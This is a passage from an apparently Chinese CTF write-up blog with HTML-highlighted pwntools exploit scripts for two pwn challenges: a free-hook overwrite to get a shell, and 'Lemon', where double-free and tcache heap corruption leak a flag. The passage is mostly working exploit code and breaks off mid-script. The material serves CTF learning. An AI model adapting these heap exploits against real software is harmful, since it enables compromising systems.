class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#9</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x6873</span><span class=\"token operator\">^</span>key<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#10</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    delete<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span>\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span>\n\npayload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x100</span><span class=\"token operator\">*</span><span class=\"token number\">3</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>rjust<span class=\"token punctuation\">(</span><span class=\"token number\">0xf8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span>\n\nadd<span class=\"token punctuation\">(</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf8</span> <span class=\"token punctuation\">,</span> decode<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#0</span>\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span>\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># 8 , 0</span>\nadd<span class=\"token punctuation\">(</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x78</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a\\n'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#1</span>\nadd<span class=\"token punctuation\">(</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x78</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a\\n'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#2</span>\n\nshow<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span>\nru<span class=\"token punctuation\">(</span><span class=\"token string\">'Pwd is: '</span><span class=\"token punctuation\">)</span>\n__malloc_hook <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> key \nlg<span class=\"token punctuation\">(</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">,</span>__malloc_hook<span class=\"token punctuation\">)</span>\n\nlibc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">=</span> __malloc_hook <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x70</span>\n__free_hook <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">]</span>\nsystem <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span>\n\nadd<span class=\"token punctuation\">(</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x78</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a\\n'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#3</span>\nadd<span class=\"token punctuation\">(</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x78</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a\\n'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#4</span>\n\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>__free_hook<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\nsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x78</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a\\n'</span><span class=\"token punctuation\">)</span>\n\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">,</span>__free_hook<span class=\"token punctuation\">)</span>\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">,</span>system<span class=\"token punctuation\">)</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x78</span> <span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>system <span class=\"token operator\">^</span> key<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token operator\">^</span>key<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">14</span> <span class=\"token punctuation\">)</span>\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">11</span><span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n@File    :   pwdFree.py\n@Time    :   2021/08/21 20:08:21\n@Author  :   Niyah \n'''</span>\n</code></pre>\n<h1 id=\"lemon\"><a class=\"markdownIt-Anchor\" href=\"#lemon\">#</a> Lemon</h1>\n<p>Lemon 这题方法用错了，爆破了挺久的，官方解的话好像两下就出来了</p>\n<p>这里首先绕一下把 flag 存到栈上</p>\n<p><img src=\"/CTF/%E7%A5%A5%E4%BA%91%E6%9D%AF%E9%83%A8%E5%88%86Pwn/4.png\" alt=\"1\"></p>\n<p>add 这里有个 double free 但只能申请 0x30 大小的，通过这个可以修改 chunk 头</p>\n<p><img src=\"/CTF/%E7%A5%A5%E4%BA%91%E6%9D%AF%E9%83%A8%E5%88%86Pwn/5.png\" alt=\"1\"></p>\n<p>edit 存在堆溢出，可以控制 tcache 管理块从而使用 fastbin，但 edit 只有一次（师傅说这里有个负溢出，看了看确实）</p>\n<p><img src=\"/CTF/%E7%A5%A5%E4%BA%91%E6%9D%AF%E9%83%A8%E5%88%86Pwn/6.png\" alt=\"1\"></p>\n<p>本题 onegadget 一个都不能用，调栈帧都不行，只能不断申请 stdout 将栈上的 flag 打印出来</p>\n<p><img src=\"/CTF/%E7%A5%A5%E4%BA%91%E6%9D%AF%E9%83%A8%E5%88%86Pwn/7.png\" alt=\"1\"></p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- encoding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys \n<span class=\"token keyword\">import</span> os \n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> \ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span> \ncontext<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span> os <span class=\"token operator\">=</span> <span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch <span class=\"token operator\">=</span> <span class=\"token string\">'amd64'</span><span class=\"token punctuation\">)</span>\nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'./lemon_pwn'</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\nlibc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc-2.26.so'</span><span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n    libc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n    <span class=\"token comment\">#p = process(['qemu-arm', binary])</span>\n    <span class=\"token comment\">#p = process(['qemu-aarch64','-L','',binary])</span>\n    <span class=\"token comment\">#p = process(['qemu-aarch64','-L','',-g,'1234',binary])</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    host <span class=\"token operator\">=</span> <span class=\"token string\">'47.104.70.90'</span>\n    port <span class=\"token operator\">=</span> <span class=\"token string\">'34524'</span>\n    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data  <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">': 0x%x'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x <span class=\"token operator\">=</span> <span class=\"token number\">12</span>     <span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span> b <span class=\"token operator\">=</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">==</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token string\">'b %s'</span><span class=\"token operator\">%</span>b<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">exhaust</span><span class=\"token punctuation\">(</span> pwn <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">global</span> p\n    i <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n    <span class=\"token keyword\">while</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n            i<span class=\"token operator\">+=</span><span class=\"token number\">1</span>\n            pwn<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span>\n            lg<span class=\"token punctuation\">(</span><span class=\"token string\">'times ========> '</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">)</span>\n            p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>DEBUG<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">else</span> <span class=\"token punctuation\">:</span>\n                p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'>>'</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">,</span>name<span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'index of your lemon: '</span><span class=\"token punctuation\">,</span>idx<span class=\"token punctuation\">)</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">'Now, name your lemon: '</span><span class=\"token punctuation\">,</span>name<span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'message for you lemon: '</span><span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">)</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">'your message: '</span><span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">eadd</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">,</span>name<span class=\"token punctuation\">,</span>size <span class=\"token operator\">=</span> <span class=\"token number\">0x600</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'index of your lemon: '</span><span class=\"token punctuation\">,</span>idx<span class=\"token punctuation\">)</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">'Now, name your lemon: '</span><span class=\"token punctuation\">,</span>name<span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'message for you lemon: '</span><span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'index of your lemon : '</span><span class=\"token punctuation\">,</span>idx<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'index of your lemon : '</span><span class=\"token punctuation\">,</span>idx<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Input the index of your lemon  : '</span><span class=\"token punctuation\">,</span>idx<span class=\"token punctuation\">)</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">'draw and color!'</span><span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'with me?'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'yes'</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># dbg()</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">'lucky number: '</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x700048</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'tell me you name first:'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\n    ru<span class=\"token punctuation\">(</span><span class=\"token string\">'is 0x'</span><span class=\"token punctuation\">)</span>\n\n    stack_low_addr <span class=\"token operator\">=</span> rint<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'stack_low_addr'</span><span class=\"token punctuation\">,</span>stack_low_addr<span class=\"token punctuation\">)</span>\n\n    <span class=\"token comment\"># sla('with me?','g')</span>\n\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x248</span><span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x248</span><span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x40</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">)</span>\n    show<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    ru<span class=\"token punctuation\">(</span><span class=\"token string\">'eat eat eat '</span><span class=\"token punctuation\">)</span>\n    addr <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'.'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x50</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'addr'</span><span class=\"token punctuation\">,</span>addr<span class=\"token punctuation\">)</span>\n\n    fake <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span> <span class=\"token punctuation\">,</span><span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x251</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span>p16<span class=\"token punctuation\">(</span>addr <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xf000</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span>\n    edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span> <span class=\"token punctuation\">,</span>fake <span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x248</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x07'</span><span class=\"token operator\">*</span><span class=\"token number\">0x40</span> <span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x248</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x01'</span><span class=\"token operator\">*</span><span class=\"token number\">2</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\x07'</span><span class=\"token operator\">*</span><span class=\"token number\">0x3e</span> <span class=\"token punctuation\">)</span>\n\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x18</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x31</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x31</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">3</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x07'</span><span class=\"token operator\">*</span><span class=\"token number\">0x40</span> <span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x31</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x31</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n\n    eadd<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> p16<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>addr<span class=\"token operator\">&amp;</span> <span class=\"token number\">0xf000</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x820</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span> <span class=\"token punctuation\">,</span> p16<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>addr<span class=\"token operator\">&amp;</span> <span class=\"token number\">0xf000</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x820</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x30</span><span class=\"token operator\">*</span><span class=\"token number\">4</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x70</span><span class=\"token operator\">*</span><span class=\"token number\">4</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token 